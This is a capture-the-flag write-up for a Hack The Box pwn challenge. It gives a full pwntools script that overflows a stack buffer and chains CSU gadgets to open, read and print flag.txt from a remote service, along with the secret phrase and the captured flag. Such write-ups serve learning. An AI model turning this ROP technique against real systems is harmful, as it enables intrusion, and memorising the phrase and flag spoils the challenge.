---
title: "Finale"
ctf: "HTB"
date: 2026-06-12
category: pwn
difficulty: easy
flag_format: "HTB{...}"
---

# Finale

## Summary

Multi-CSU ROP chain to `open("flag.txt",0)`, `read(5,bss,0x100)`, `write(1,bss,0x80)` — exploiting a 64-byte stack buffer that reads 4096 bytes via `read(0,s,0x1000)`.

## Solution

### Binary analysis

- Full RELRO, NX enabled, no canary, no PIE
- `finale()`: 64B buffer at rbp-0x40, reads **0x1000** bytes (not 0x80 per PDF) into it — 72 bytes to reach return address
- Key gadgets: `csu_pop` (0x401512), `csu_call` (0x4014f8), `pop rdi; ret` (0x4011f2)
- PLT: `read@0x401090`, `open@0x4010e0`, `write@0x401050`, `puts@0x401040`
- Secret phrase: `s34s0nf1n4l3b00` (15 chars, %16s, strncmp checks 0xF bytes)

### Exploit

The overflow allows a ~550-byte ROP chain. Using CSU gadgets for full register control (rdx needed for read count):

1. **CSU read(0, bss_path, 32)** — read `"flag.txt"` from stdin into BSS
2. **CSU open(bss_path, 0, 0)** — open the file (returns fd=5 on remote)
3. **CSU read(5, bss_data, 0x100)** — read flag contents
4. **CSU write(1, bss_data, 0x80)** — output flag to stdout

```python
from pwn import *
context.arch = 'amd64'

r = remote('154.57.164.77', 32702)
r.recvuntil(b'secret phrase: ')
r.sendline(b's34s0nf1n4l3b00')
r.recvuntil(b'wish for next year: ')

csu_pop, csu_call = 0x401512, 0x4014f8
got_read, got_open, got_write = 0x403250, 0x403278, 0x403230
bp, bd = 0x404040, 0x404060

rop = b'A' * 72
rop += p64(csu_pop) + p64(0)+p64(1)+p64(0)+p64(bp)+p64(32)+p64(got_read)
rop += p64(csu_call) + p64(0)+p64(0)*6
rop += p64(csu_pop) + p64(0)+p64(1)+p64(bp)+p64(0)+p64(0)+p64(got_open)
rop += p64(csu_call) + p64(0)+p64(0)*6
rop += p64(csu_pop) + p64(0)+p64(1)+p64(5)+p64(bd)+p64(0x100)+p64(got_read)
rop += p64(csu_call) + p64(0)+p64(0)*6
rop += p64(csu_pop) + p64(0)+p64(1)+p64(1)+p64(bd)+p64(0x80)+p64(got_write)
rop += p64(csu_call) + p64(0)+p64(0)*6

r.send(rop)
import time; time.sleep(0.5)
r.send(b'flag.txt'.ljust(32, b'\x00'))
time.sleep(2)
data = r.recv(timeout=5)
flag = data[84:].replace(b'\x00', b'').strip()
print(flag.decode())
```

### Key gotchas

- Path is relative `flag.txt`, NOT `/challenge/flag.txt`
- fd=5 on remote (open returns 5, not 3)
- `read(0, s, 0x1000)` in finale enables large ROP chains despite 64B buffer

## Flag

```
HTB{wh0_n33d5_l1bc_wh3n_u_h4v3_st4ck_l45k5}
```
